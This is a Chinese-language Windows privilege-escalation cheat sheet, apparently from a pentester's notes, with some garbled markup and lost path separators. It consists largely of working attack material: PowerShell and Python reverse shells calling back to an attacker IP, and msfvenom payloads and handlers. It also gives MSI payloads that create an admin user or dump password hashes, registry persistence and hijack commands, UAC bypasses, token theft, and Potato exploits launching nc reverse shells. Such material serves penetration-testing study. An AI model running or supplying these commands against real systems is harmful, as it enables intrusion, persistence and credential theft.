$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()” **font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);powershell -nop -c/font**: **font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);powershell/font**: 调用 PowerShell。 **font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);-nop/font**: 简写为 font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);-NoProfile/font，表示不加载用户配置文件。这可以加快启动速度，并避免配置文件中的设置影响脚本运行。 **font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);-c/font**: 简写为 font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);-Command/font，表示执行指定的命令。 **font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);$client = New-Object Net.Sockets.TCPClient(192.168.129.152,5555)/font**: 创建一个 font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);TCPClient/font 对象，用于建立 TCP 连接。 **font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);192.168.129.152/font**: 目标服务器的 IP 地址。 **font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);5555/font**: 目标服务器的端口号。 **font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);$stream = $client.GetStream()/font**: 获取 font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);TCPClient/font 的网络流（font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);NetworkStream/font），用于读取和写入数据。 **font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);[byte[]]$bytes = 0..65535|%{0}/font**: 创建一个大小为 65536 的字节数组，用于存储从网络流中读取的数据。 **font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);0..65535/font**: 生成一个从 0 到 65535 的数字序列。 **font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);|%{0}/font**: 对每个数字生成一个值为 0 的字节。 **font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)/font**: 从网络流中读取数据，直到没有更多数据可读。 **font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);$stream.Read($bytes, 0, $bytes.Length)/font**: 从网络流中读取数据到 font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);$bytes/font 数组中，返回读取的字节数。 **font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);-ne 0/font**: 检查是否读取到数据（即返回值不为 0）。 **font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)/font**: 将读取的字节转换为字符串。 **font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);System.Text.ASCIIEncoding/font**: 使用 ASCII 编码将字节转换为字符串。 **font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);$i/font**: 读取的字节数。 **font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);$sendback = (iex $data 21 | Out-String )/font**: 执行从网络流中读取的命令，并捕获输出。 **font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);iex $data/font**: 使用 font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);Invoke-Expression/font（font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);iex/font）执行 font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);$data/font 中的命令。 **font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);21/font**: 将错误输出重定向到标准输出。 **font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);| Out-String/font**: 将输出转换为字符串。 **font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);$sendback2 = $sendback + PS + (pwd).Path + /font**: 构造返回的字符串，包括命令的输出和当前路径。 **font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);$sendback/font**: 命令的输出。 **font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);PS + (pwd).Path + /font**: 当前路径提示符。 **font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)/font**: 将返回的字符串转换为字节数组。 **font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);$stream.Write($sendbyte,0,$sendbyte.Length)/font**: 将返回的字节写回网络流。 **font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);$stream.Flush()/font**: 刷新网络流，确保所有数据都已发送。 **font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);$client.Close()/font**: 关闭 TCP 客户端。 cmd版本 powershell -nop -c “$client New-Object Net.Sockets.TCPClient(‘192.168.129.152’,5555);$stream $client.GetStream(); [byte[]]$bytes 0..65535|%{0};while(($i $stream.Read($bytes, 0, $bytes.Length)) -ne 0){; $data (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback (cmd c $data 21 | Out-String ); $sendback2 $sendback + ‘CMD ‘ + (pwd).Path + ‘ ‘;$sendbyte ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()” MSF反弹 msfvenom -p windowsmeterpreterreverse_tcp LHOST192.168.129.152 LPORT5555 -f exe -o shell.exe（msf 本地IP） msf6 use exploit/multi/handler[*] Using configured payload generic/shell_reverse_tcpmsf6 exploit(multi/handler) set payload windows/meterpreter/reverse_tcppayload = windows/meterpreter/reverse_tcp(show options)msf6 exploit(multi/handler) set lhost 192.168.129.152lhost = 192.168.183.142msf6 exploit(multi/handler) set lport 5555lport = 4444msf6 exploit(multi/handler) exploit[*] Started reverse TCP handler on 192.168.129.152:5555 创建meterpreter会话后 execute -H -i -f cmd.exe python反弹shell kali nc -lvp 5555 win # -*- coding:utf-8 -*-import osimport selectimport socketimport sysimport subprocessdef ReserveConnect(addr, port): 反弹连接shell try: shell = socket.socket(socket.AF_INET, socket.SOCK_STREAM) shell.connect((addr,port)) except Exception as reason: print ([-] Failed to Create Socket : %s%reason) exit(0) rlist = [shell] wlist = [] elist = [shell] while True: shell.send(cmd:.encode()) rs,ws,es = select.select(rlist,wlist,wlist) for sockfd in rs: if sockfd == shell: command = shell.recv(1024) if command == exit: shell.close() break result, error = subprocess.Popen(command,shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE).communicate() shell.sendall(result.decode(GB2312).encode(UTF-8))# 主函数运行def run(): if len(sys.argv)3: print(Usage: python reverse.py [IP] [PORT]) else: url = sys.argv[1] port = int(sys.argv[2]) ReserveConnect(url,port)if __name__ == __main__: run() - 执行python reverse_win.py 127.0.0.1 5555 Windows 内核溢出漏洞一：手工 systeminfo python wes.py sys.txt https://github.com/bitsadmin/wesng 查找内核提权exp https://github.com/k8gege/Ladon https://github.com/Ascotbe/KernelHub https://github.com/nomi-sec/PoC-in-GitHub https://github.com/offensive-security/exploitdb http://cve.mitre.org/data/refs/refmap/source-MS.html 二:msf自动(反弹shell后) postwindowsgatherenum_patches(半自动，还得自己找,找出系统中缺少的补丁) bg use postwindowsgatherenum_patches set session 1 run postmultireconlocal_exploit_suggester(全自动) bg use postmultireconlocal_exploit_suggester. set session 1 run 找到绿色的，可用的,一个一个试 用第一个试试 use exploitwindowslocalalways_install_elevated set session 1 换一个不一样的端口，然后，另外打开一个msf,监听这个端口 错误的系统配置提权1.不安全的服务权限查询服务的配置： sc.exe qc name 查询服务的当前状态： sc.exe query name 修改服务的配置选项： sc.exe config name option= value 开始停止服务： net start/stop name accesschk.exe用法介绍 命令 查看用户用户组对文件文件夹的权限 accesschk 用户用户组文件件夹 列出所有服务的权限 accesschk.exe -ucqv * 查看用户用户组具有写权限的服务 accesschk用户用户组 -cw * 要查看用户用户组对 HKEY LOCAL MACHINE、Software目录下注册表项的权限 accesschk-k用户用户组 hkl\\software 查看每个人都可以修改的全局对象 accesschk -wuo everyone font - 反弹shell - 用winPEASany.exe 检查font style=color:rgb(36, 41, 47);服务配置错误 .\\winPEASany.exe quiet servicesinfo/font - font style=color:rgb(36, 41, 47);查看是否有手工修改的服务/font - font style=color:rgb(36, 41, 47);.\\accesschk.exe /accepteula -uwcqv user 服务/font - font style=color:rgb(36, 41, 47);检查用户或组是否有权访问文件，目录，服务和注册表项/font - font style=color:rgb(36, 41, 47);sc qc 服务 /font - font style=color:rgb(36, 41, 47);检查当前配置/font - font style=color:rgb(36, 41, 47);sc config /fontfont style=color:rgb(36, 41, 47);服务/fontfont style=color:rgb(36, 41, 47); binpath= \\C:\\Users\\user\\Desktop\\a002.exe\\ /font - font style=color:rgb(36, 41, 47);重新配置服务使我们反向shell/font - font style=color:rgb(36, 41, 47);net start /fontfont style=color:rgb(36, 41, 47);服务/font - font style=color:rgb(36, 41, 47);启动服务触发漏洞反弹shell/font 2.未引用的服务路径1.运行winPEAS以检查服务配置错误：.\\winPEASany.exe quiet servicesinfo 2. 发现”unquotedsvc”服务有一个未引用的路径 ，其中也 包含 空格：C:\\Program Files\\Unquoted Path Service\\Common Files\\unquotedpathservice.exe 3. 使用sc确认此问题：sc qc unquotedsvc 4.使用accesschk.exe检查写入权限：.\\accesschk.exe /accepteula -uwdq C:\\ .\\accesschk.exe /accepteula -uwdq C:\\Program Files\\ .\\accesschk.exe /accepteula -uwdq C:\\Program Files\\Unquoted Path Service\\ 1. .\\accesschk.exe /accepteula -uwdq C:\\**功能 功能：扫描 C 盘根目录下的所有文件和文件夹参数含义：/accepteula：自动接受最终用户许可协议-u：只显示当前用户的权限-w：只显示有写入权限的项目-d：显示目录权限-q：静默模式，不显示横幅2. .\\accesschk.exe /accepteula -uwdq C:\\Program Files\\功能：扫描 Program Files 目录及其子目录目的：找出当前用户在 Program Files 中有写入权限的位置3. .\\accesschk.exe /accepteula -uwdq C:\\Program Files\\Unquoted Path Service\\功能：专门扫描特定服务目录特点：这是一个典型的未加引号的服务路径示例 5.复制可执行的反向外壳并适当重命名copy C:\\Users\\user\\Desktop\\a002.exe C:\\Program Files\\Unquoted Path Service\\Common.exe 系统会按以下顺序查找可执行文件：C:\\Program.exeC:\\Program Files\\Unquoted.exeC:\\Program Files\\Unquoted Path.exeC:\\Program Files\\Unquoted Path Service\\Common.exe 6.启动服务触发漏洞进行反弹shellnet start unquotedsvc 3.注册表权限弱 由于注册表条目可能具有 ACL，如果 ACL 配置错误，即使我们不能直接修改服务，也有可能修改服务的配置 4.不安全的服务可执行5.msf攻击模块需要提前获取一个session exploitwindowslocalservice_permissions exploitwindowslocalunquoted_service_path 注册表Windows 注册表是一个庞大的配置数据库，存储了系统和应用程序的配置信息。由于其重要性，注册表中的漏洞经常成为攻击者的目标。HKEY_CLASSES_ROOT（HKCR）：存储文件类型关联、COM 对象等信息，用于决定系统如何处理不同类型的文件。例如，当双击一个.docx 文件时，系统会依据此分支中的信息调用相应的程序（如 Word）来打开它。 HKEY_CURRENT_USER（HKCU）：包含当前登录用户的个性化设置，如桌面布局、浏览器书签、应用程序偏好设置等。每个用户登录时，系统会加载属于该用户的此分支数据。 HKEY_LOCAL_MACHINE（HKLM）：存储与本地计算机相关的系统设置，这些设置对所有用户都生效，包括硬件配置、软件安装信息、系统服务配置等。例如，安装的打印机驱动程序信息就存储在此分支。 HKEY_USERS：包含所有已登录用户的配置文件，HKCU 实际上是 HKEY_USERS 下对应当前登录用户的子键的映射。 HKEY_CURRENT_CONFIG（HKCC）：存储当前硬件配置文件的相关信息，这些信息是系统在启动时根据硬件设备情况动态生成的。 1 自启动项Windows 启动时会自动运行某些注册表项中的程序。攻击者可以添加或修改这些项，以便在系统启动时执行恶意代码。 示例： reg add “HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run” v “Malicious” t REG_SZ d “C:\\malicious.exe” f 2 服务配置中的 ImagePath某些服务的可执行文件路径存储在注册表中。攻击者可以通过修改这些路径来执行恶意代码。 示例： reg add “HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\VulnerableService” v ImagePath t REG_SZ d “C:\\malicious.exe” f 修改后，重新启动服务以执行恶意代码： sc stop VulnerableServicesc start VulnerableService 3 AlwaysInstallElevatedAlwaysInstallElevated 是一种允许非管理员用户以 SYSTEM 权限运行 MSI 文件的设置。通过查询以下、注册表项，可以检查该设置是否启用： reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevatedreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated.\\winPEASany.exe quiet windowscreds 查看是否设置了两个注册表值 如果该设置启用，可以利用它来执行恶意 MSI 文件： msiexec i malicious.msi msf use exploitwindowslocalalways_install_elevated(先反弹shell) 如果失败了我们可以使用MSF生成 msi文件然后上传上去运行即可 msfvenom -p windowsmeterpreterreverse_tcp LHOST192.168.0.106 LPORT6789 -f msi -o payload.msi 建立一个新的监听(上面的那个会话不要关掉) 将msi文件通过shell传上去 upload payload.msi execute “msiexec.exe quiet qn i payload.msi” 创建一个具有管理员权限的用户通过恶意 MSI 文件，攻击者可以创建一个具有管理员权限的新用户。以下是创建恶意 MSI 文件的步骤： msfvenom -p windowsadduser USERhacker PASSPassword123 -f msi -o adduser.msi 执行 MSI 文件创建新用户： msiexec i adduser.msi 这个命令将在系统中创建一个名为 “hacker” 的用户，并赋予管理员权限。 提取敏感信息攻击者可以创建一个 MSI 文件，用于提取系统中的敏感信息，如密码哈希或注册表键值。以下是一个示例： msfvenom -p windowsgatherhashdump -f msi -o hashdump.msi 执行 MSI 文件提取密码哈希： msiexec i hashdump.msi 这个命令将提取系统中的密码哈希，并将其发送到指定的远程服务器。 运行 PowerShell 脚本攻击者可以利用 MSI 文件运行复杂的 PowerShell 脚本，以执行多步骤的攻击。以下是创建一个运行 PowerShell 脚本的恶意 MSI 文件： msfvenom -p windowspowershell_exec -f msi -o ps_script.msi CMD”powershell -ExecutionPolicy Bypass -File C:\\malicious.ps1” 执行 MSI 文件运行 PowerShell 脚本： msiexec i ps_script.msi 这个命令将以 SYSTEM 权限运行指定的 PowerShell 脚本。 4 注册表键权限某些注册表键可能配置了不安全的权限，允许低权限用户修改或删除这些键。攻击者可以利用这一点来更改系统配置或植入恶意代码。 示例： icacls “HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\VulnerableService” grant Everyone:F 修改注册表键后，重新启动服务或系统以执行恶意代码。 5 安全描述符定义语言（SDDL）注册表项的安全描述符定义语言（SDDL）字符串定义了谁可以访问该项。攻击者可以修改 SDDL 字符串以获得对某些注册表项的完全控制权。 示例： reg add “HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\VulnerableService” t REG_SZ v “Security” d “D:(A;;GA;;;WD)” f 此命令将注册表项的权限设置为允许所有用户完全控制。 6 环境变量劫持Windows 系统中的某些环境变量值存储在注册表中，攻击者可以通过修改这些值来劫持系统行为。 示例： reg add “HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment” v “Path” t REG_EXPAND_SZ d “C:\\malicious;%” f 此命令将环境变量 Path 修改为包含恶意路径，从而劫持系统中运行的程序。 7 注册表钩子攻击者可以在注册表中添加钩子，使得当某些注册表项被访问时，恶意代码会被执行。 示例： reg add “HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\target.exe” v “Debugger” t REG_SZ d “C:\\malicious.exe” f 此命令会使font style=color:rgb(51, 51, 51);target.exe/font在每次执行时都启动font style=color:rgb(51, 51, 51);malicious.exe/font。 8 AppInit_DLLs 注入通过修改font style=color:rgb(51, 51, 51);AppInit_DLLs/font注册表项，攻击者可以将 DLL 注入到所有进程中，从而获得系统控制权。 示例： reg add “HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows” v “AppInit_DLLs” t REG_SZ d “C:\\malicious.dll” f 此命令会在所有进程启动时加载font style=color:rgb(51, 51, 51);malicious.dll/font。 9 启动与恢复设置攻击者可以修改系统的启动与恢复设置，以便在系统崩溃时执行恶意代码。 示例： reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\CrashControl /v AutoReboot /t REG_DWORD /d 0 /freg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\CrashControl /v DumpFile /t REG_EXPAND_SZ /d C:\\malicious.dmp /f 此命令会将系统崩溃后的转储文件路径设置为恶意文件。 通过这些方法，攻击者可以利用注册表中的配置错误和权限漏洞，进行权限提升和系统控制。安全人员应特别注意注册表的配置和权限管理，以防范潜在的攻击。 组策略组策略首选项postwindowsgathercredentialsgpp 绕过UAC它是Windows的一个安全功能，它支持防止对操作系统进行未经授权的修改，UAC确保仅在管理员授权的情况下进行某些更改。如果管理员不允许更改，则不会执行这些更改，并且Windows系统保持不变。 一些没有管理员权限无法完成的操作： 注册表修改（如果注册表项在HKEY_LOCAL_MACHINE下（因为它影响多个用户），它将是只读的） 加载设备驱动程序 DLL注入 修改系统时间（时钟） 修改用户帐户控制设置（通过注册表，可以启用禁用该设置，但您需要正确的权限才能执行此操作） 修改受保护的目录（例如Windows文件夹，Program Files） 计划任务（例如，以管理员权限自动启动） 1.白名单什么是UAC白名单？操作系统自己有一些进程在运行的时候不需要通过验证就直接可以运行，这些程序在UAC白名单中，比如：slui.exe.taskmgr.exe等。 当这些程序运行的时候可以通过DLL劫持，DLL注入或者注册表劫持等 绕过DLL去执行我们的恶意程序。 这里举例注册表劫持： 首先使用工具找出白名单的程序。在UAC白名单中的程序都有一个特点，就是Mainfest数据中的autoElevate属性的值为True。 strings.exe 可以检测程序是否有autoElevate 属性，从而找出白名单的程序： strings.exe /accepteula -s C:\\windows\\system32\\*.exe | findstr /i aotoElevate 假如ComputerDefaults.exe 进程： 打开这个exe,没有验证直接进入默认应用界面。 通过进程监控 分析该进程会发现，它会先去访问HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command，发现没东西后再去访问 HKCR\\ms-settings\\Shell\\Open\\Command\\DelegateExecute. 然后我们就可以劫持HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command 中的默认值和 DelegateExecute reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /d C:\\windows\\system32\\cmd.exe #可以是攻击载荷的路径。reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /v DelegateExecute /t REG_SZ /d C:\\windows\\system32\\cmd.exe 2.DDL劫持什么是DLL劫持，程序通常并不是一个完整的可执行文件，被分割成一些DLL文件。当应用程序加载DLL时，如果没有指定DLL的绝对路径，那么程序就会以特定的顺序去遍历搜索加载的DLL，如果将同名的恶意的DLL文件放在真正的DLL之前，那么就会被劫持。这就是劫持。 但是这前提是这个遍历目录可写。这个目录通常又不可写。所以这个技术通常和模拟可信任技术来配合使用。 所以提出下面这个 模拟可信任目录 3.模拟可信任目录之前说了UAC白名单中的程序的manifest 数据中的autoElevate为true，当执行的时候，不但要检查这个条件，还要检查这个程序是否在可信任目录C：\\windows\\system32中。两者缺一不可。但是当系统在检查可信任目录时，会自动去除路径中的空格。比如 ”C:\\Windows \\system32” 会被解析成 “C:\\windows\\system32” 那么我们就可以创建一个”C:\\Windows \\system32”目录，把白名单中的程序复制进这个含空格的目录中。再把恶意DLL文件放到这个模拟的可信任目录中。然后运行这个模拟目录中的可执行程序。就会达到绕过UAC DLL劫持提权的效果。 md \\\\?\\C:\\Windows md \\\\?\\C:\\Windows \\System32copy C:\\Windows\\System32\\winSTA.exe C:\\Windows \\System32\\winSAT.exe 但是制作DLL的时候，要注意恶意DLL的导出函数要与被劫持的DLL一样。 专业名词解释：DelegateExecute 是 Windows 操作系统中的一个 COM (Component Object Model) 接口，它通常与应用程序扩展和外部处理程序相关。DelegateExecute 接口允许一个应用程序或组件将某些任务委托给其他程序或处理程序来执行，通常是为了增强功能或实现某种定制化的行为。 Manifest 数据指的是一个应用程序清单（Application Manifest），它是一个用于描述应用程序特性、依赖关系、权限要求以及其他元数据的 XML 文件。应用程序清单通常附加到应用程序的可执行文件（如 .exe 文件）或动态链接库（DLL）中，以便操作系统和其他程序能够正确地识别和与应用程序互动。 4.MSF下的Bypassexploitwindowslocalask #弹出UAC确认窗口，点击后获得system权限 exploitwindowslocalbypassuac #该模块运行时会因为在目标机上创建多个文件而被杀毒软件识别，因此通过该模块提权成功率很低。 exploitwindowslocalbypassuac_injection #该模块直接运行在内存的反射DLL中，所以不会接触目标机器的硬盘，从而降低了被杀毒软件检测出来的概率。 exploitwindowslocalbypassuac_fodhelper exploitwindowslocalbypassuac_eventvwr exploitwindowslocalbypassuac_comhijack 令牌窃取什么是令牌 令牌(token)是系统的临时秘钥，相当于账号和密码，用来决定是否允许这次请求和判断这次请求是属于哪一个用户的。它允许你在不提供密码或其他凭证的前提下，访问网络和系统资源，这些令牌将持续存在于系统中，除非系统重新启动。令牌最大的特点就是随机性，不可预测，黑客或软件无法猜测出令牌。 可以通过操作一个高权限进程的访问令牌来 当做一个进程的令牌。就是说偷其他进程的令牌来用。然后就可以拥有那个令牌自身拥有的权限。 能偷其他进程的访问令牌的条件：该用户必须有SeImpersonatePrivilege 和SeAssignPrimaryTokenPrivilegeSeIncreaseQuotaPrivilege权限。而这两个权限的用户通常是系统管理员账户，web服务账户，和IIs MsSQL账户等。 1.直接偷****使用incognnito.exe。上传到主机。 incognito.exe list_tokens -u #列举当前主机上的所有访问令牌incognito.exe execute -c NT AUTHORITY\\SYSTEM whoami#-c 偷令牌，whoami 偷完后执行的命令incognito.exe execute -c travel-me\\Bob cmd偷域下Bob的令牌，然后执行它的。也就是切换到Bob的用户。 2.MSF偷#msf 拿到一个会话 use incognito #进入incognito模块 list_tokens -u #列出令牌 Delegation Token：也就是授权令牌，它支持交互式登录(例如可以通过远程桌面登录访问) Impresonation Token：模拟令牌，它是非交互的会话。 这里窃取令牌，主要是窃取进程中的令牌 #使用令牌假冒用户 impresonate_Token “令牌名” incognito：exemsf均可，msf中的incognito是从windows中的exe文件中移植过去的，这里以msf自带的incognito为例。 首先我们进入之前获取的meterpreter msf5 session 3 meterpreter load incognito 加载incognito（除了incognito外还可以加载其他插件比如mimikatz，我们之后会用到） meterpreter getuid 查看当前token meterpreter list_tokens -u 列出可用token meterpreter impersonate_token “NT AUTHORITY\\SYSTEM”token窃取，格式为impersonate_token”主机名\\用户名” meterpreter getuid 查看当前token meterpreter rev2self 返回之前的token 3.Potato提权Hot PotatoJuicy Potato.什么是 BITS 和 CLSID？ CLSID是标识 COM 类对象的全局唯一标识符。它是一个类似UUID的标识符。 程序员和系统管理员使用后台智能传输服务 (BITS)从 HTTP Web 服务器和 SMB 文件共享下载文件或将文件上传到 HTTP Web 服务器和 SMB 文件共享。关键是BIT实现了IMarshal接口并允许代理声明强制 NTLM 身份验证。 https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md(CLSID) whoami all whoami priv 如果开启SeImpersonate权限，juicypotato的参数可以使用 -t t 如果开启SeAssignPrimaryToken权限，juicypotato的参数可以使用 -t u 如果均开启，可以选择-t * 如果均未开启，那么无法提权 这些因素直接影响你能否找到可用的 CLSID，是整个利用过程中的关键环节。 一个有效的 CLSID 这是实际操作中最具挑战性的部分。你需要为特定特定版本的 Windows 系统找到一个可用的 CLSID。 Juicy Potato 发布时附带了一个 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);CLSID.list/font.list 文件，其中列出了在各种 Windows 版本中测试过的 CLSID。 你必须根据目标系统的版本，从这个列表中挑选出一个或多个 CLSID进行尝试。 例如： Windows 10 Server 20162019 常用的 CLSID 可能与 Windows 7 Server 2008 不同。 一个历史上广泛使用的 CLSID 是 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);{4991d34b-80a1-4291-83b6-3328366b9097}/font (BITS服务)。 系统未打补丁或配置未被强化 微软通过后续的更新对这类滥用 COM 权限的行为进行了限制（尽管没有完全封堵）。 某些安全软件或组策略可能会阻止未经授权的 COM 激活。 利用流程与参数对应关系当你运行 Juicy Potato 时，这些前提条件直接体现在命令行参数上： # 一个典型的 Juicy Potato 命令示例JuicyPotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -t * -c CLSID **font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);-c {CLSID}/font**: 对应前提 #2 和 #和 #4。你需要在这里填入一个在目标系统上可用的 CLSID。 **font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);-t */font**: 对应前提 #1。font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);-t */font 表示工具会自动尝试使用 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);SeImpersonatePrivilege/font 或 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);SeAssignPrimaryTokenPrivilege/font。 **font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);-l 1337/font**: 对应前提 #3。指定一个本地监听端口。 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);-l port port/font 参数只是告诉 Juicy Potato 工具：”请在内部使用这个端口来完成权限欺骗过程”。所有的监听、通信、令牌窃取都是工具自动完成的，您只需要坐在当前的shell窗口中等待新的 SYSTEM 权限的 cmd.exe 进程启动即可。 在你决定使用 Juicy Potato 之前，请按此清单检查： 权限检查：运行 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);whoami /priv/font，确认输出中 已启用 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);SeImpersonatePrivilege/font 或 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);SeAssignPrimaryTokenPrivilege/font。 系统识别：确定目标机器的 Windows 版本（如 Win10, Server 2012 R2等）。 CLSID 准备：根据目标系统版本，从 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);CLSID.list/font 中挑选几个可能的候选。 执行尝试：使用类似下面的命令进行尝试，如果失败，更换 CLSID 再次尝试。 第一次尝试，使用一个针对你目标系统版本的 CLSID JuicyPotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -t * -c {4991d34b-80a1-4291-83b6-3328366b9097} 如果失败，尝试另一个 CLSID JuicyPotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -t * -c {XXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX} Rotten Potato(烂土豆)此技术不适用于 Windows 10 1809 和 Windows Server 2019 的版本 1.通过NT AUTHORITY/SYSTEM运行的RPC将尝试通过CoGetInstanceFromIStorage API调用向我们的本地代理进行身份验证2.135 端口的RPC将用于回复第一个RPC正在执行的所有请求充当模板3.AcceptSecurityContextAPI调用以在本地模拟NT AUTHORITY/SYSTEM 1. 使用CoGetInstanceFromIStorage API 调用欺骗RPC,对代理进行身份验证.在此调用中指定了代理 IP/端口2. RPC 向代理发送 NTLM 协商包3. 代理依赖的NTLM协商到RPC在端口135，被用作模板。同时，执行对AcceptSecurityContext的调用以强制进行本地身份验证注:此包被修改为强制本地身份验证.4. 5. RPC 135和AcceptSecurityContext用NTLM Challenge回复6. 将两个数据包的内容混合以匹配本地协商并转发到RPC7. RPC使用发送到AcceptSecurityContext(8.)的NLTM Auth包进行响应，并执行模拟(9.) Rogue Patato 攻击机准备（Kali 或任意你控制的 Linux）1.1 先把 135 端口抢过来，做转发器 font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);sudo socat tcp-listen:135,reuseaddr,fork tcp:靶机IP:9999/font 1.2 再起一个 nc 等会接收 SYSTEM 反向 Shell font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);nc -nvlp 443/font 把文件丢到靶机同一目录（这里用 C:\\temp） RoguePotato.exe （GitHub 直接下 Release 即可 ） nc64.exe （反连载体，可换成 msfps 等 payload） 靶机一次执行 font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);C:\\temp\\RoguePotato.exe -r 攻击机IP -l 9999 -e C:\\temp c64.exe 攻击机IP 443 -e cmd.exe/font 参数解释 font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);-r/font 攻击机 IP（socat 所在） font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);-l 9999/font 本地假 OXID 解析器监听端口，必须和 socat 转发对应 font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);-e/font 提权成功后以 SYSTEM 身份启动的命令（这里给 nc 反向 shell） SweetPotato GodPotato利用程序内置的 Clsid 进行权限提升，并执行一个简单的命令。 GodPotato -cmd cmd /c whoami 执行反向 shell 命令 GodPotato -cmd nc -t -e C:\\Windows\\System32\\cmd.exe 